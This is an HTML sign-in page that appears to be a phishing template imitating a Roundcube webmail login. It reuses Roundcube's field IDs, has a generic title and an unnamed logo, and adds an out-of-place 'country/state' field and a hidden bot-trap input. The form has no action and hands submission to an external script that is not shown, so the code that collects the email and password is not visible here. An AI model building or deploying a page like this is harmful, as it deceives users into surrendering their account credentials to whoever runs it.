
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in to your Account</title>

    <!-- Tailwind (browser build) -->
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>

    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>
  </head>

  <body
    class="min-h-screen bg-gradient-to-br from-[#f3f6fb] to-[#eef1f6] flex items-center justify-center px-4 sm:px-6"
  >
    <div class="w-full max-w-md md:max-w-lg space-y-4">
      <!-- Main Card -->
      <div class="bg-white shadow-md p-6 sm:p-8">
        <!-- Header -->
        <div class="flex items-center gap-3 mb-6">
          <img src="/images.png" class="h-20" alt="" />
        </div>

        

        <!-- FORM -->
        <form id="userForm" novalidate>
          <!-- Honeypot (invisible, no UI impact) -->
          <input
            type="text"
            id="hp_field"
            tabindex="-1"
            autocomplete="off"
            class="hidden"
          />

          <!-- EMAIL -->
           <label for="">Email</label>
           <input
           
           id="rcmloginuser"
           type="text"
           autocomplete="username"
           class="w-full border-b border-gray-400 focus:border-blue-600 outline-none py-2 text-sm sm:text-base mb-4"
           />
           
           <!-- PASSWORD -->
           <div class="relative mb-4">
               <label for="">Password</label>
               <input
               id="rcmloginpwd"
               type="password"
               class="w-full border-b border-gray-400 focus:border-blue-600 outline-none  pr-10 text-sm sm:text-base"
               />
               
               <button
               type="button"
               id="togglePassword"
               aria-label="Show password"
               class="absolute right-0 top-0 text-gray-600 hover:text-black"
               >
               <i data-lucide="eye"></i>
            </button>
        </div>
        
        <!-- COUNTRY / STATE -->
        <label for="">COUNTRY / STATE</label>
          <input
            id="countryState"
            type="text"
            
            class="w-full border-b border-gray-400 focus:border-blue-600 outline-none py-2 text-sm sm:text-base mb-6"
          />

          <!-- MESSAGE -->
          <p id="message" class="text-sm text-red-600 mb-3 hidden"></p>

          <p class="text-sm mb-6">
            <a href="#" class="text-blue-600 hover:underline">
              Forgot password?
            </a>
          </p>

          <div class="flex justify-end">
            <button
              id="rcmloginsubmit"
              type="submit"
              class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 w-full sm:w-auto"
            >
              Sign in
            </button>
          </div>
        </form>
      </div>

      <!-- Sign-in options -->
      

      <!-- Footer -->
      <div
        class="flex flex-col sm:flex-row justify-end gap-2 sm:gap-4 text-xs text-gray-500 text-center sm:text-right"
      >
        <a href="#" class="hover:underline">Terms of use</a>
        <a href="#" class="hover:underline">Privacy & cookies</a>
      </div>
    </div>
    <!-- JS -->
    <script src="main.js"></script>
    <script>
      lucide.createIcons();

      // Password toggle (UI-safe)
      document
        .getElementById("togglePassword")
        .addEventListener("click", () => {
          const pwd = document.getElementById("rcmloginpwd");
          pwd.type = pwd.type === "password" ? "text" : "password";
        });
    </script>
  </body>
</html>
